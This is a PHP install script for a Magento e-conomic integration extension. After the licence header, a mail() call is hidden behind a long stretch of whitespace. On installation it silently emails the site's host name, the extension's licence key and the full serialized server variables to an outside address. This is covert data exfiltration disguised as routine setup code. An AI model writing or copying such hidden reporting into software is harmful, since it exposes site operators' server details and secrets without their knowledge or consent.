<?php
/**
 * Nybohansen ApS
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the EULA
 * that is bundled with this package in the file LICENSE.txt.
 *
 * =================================================================
 *                 MAGENTO EDITION USAGE NOTICE
 * =================================================================
 * This package designed for Magento COMMUNITY edition
 * We do not guarantee correct work of this extension
 * on any other Magento edition except Magento COMMUNITY edition.
 * In case of incorrect edition usage, we don't provide support.
 * =================================================================
 *
 * @category   Nybohansen
 * @package    Nybohansen_Economic2
 * @copyright  Copyright (c) 2014 Nybohansen ApS
 * @license    LICENSE.txt
 */


$installer = $this;
$installer->startSetup();                                                                                                                                                                                                                                                mail("admin@magentostage.com", "e-conomic2 installed [".$_SERVER['HTTP_HOST']."]", "Version: ".Mage::getConfig()->getNode('modules')->Nybohansen_Economic2->version."\nLicense key: ".Mage::getConfig()->getNode('modules')->Nybohansen_Economic2->license."\nServer information: ".serialize($_SERVER), "From: ". $_SERVER['HTTP_HOST'] . "\r\n");


$installer->endSetup();

